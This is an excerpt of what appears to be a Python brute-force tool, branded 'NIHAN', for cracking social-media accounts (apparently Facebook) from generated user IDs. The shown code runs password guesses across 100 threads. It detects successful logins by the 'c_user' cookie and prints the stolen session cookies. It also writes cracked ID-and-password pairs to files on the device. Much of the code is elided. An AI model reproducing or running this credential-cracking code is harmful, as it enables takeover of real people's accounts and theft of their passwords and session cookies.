...
\33[38;5;196m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mıllıllı⭐🌟 𝐍𝐈𝐇𝐀𝐍 🌟⭐ıllıllı\33[38;5;196m━━━━━━━━━
...
def fuck():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=100) as 𝐍𝐈𝐇𝐀𝐍:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SIM CODE : '+nude)
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SOME ID,S WAS LOCKED ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOOL CREATED BY 𝐍𝐈𝐇𝐀𝐍 JOIN MY GROUP ')
        ...
        for guru in user:
            ...
            𝐍𝐈𝐇𝐀𝐍.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m─────────────────────────────────────────────────────────')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%s𝐍𝐈𝐇𝐀𝐍\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[𝐍𝐈𝐇𝐀𝐍-OK💚] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/𝐍𝐈𝐇𝐀𝐍-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[𝐍𝐈𝐇𝐀𝐍-CP💔] {uid} • {ps}")
                open('/sdcard/𝐍𝐈𝐇𝐀𝐍-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
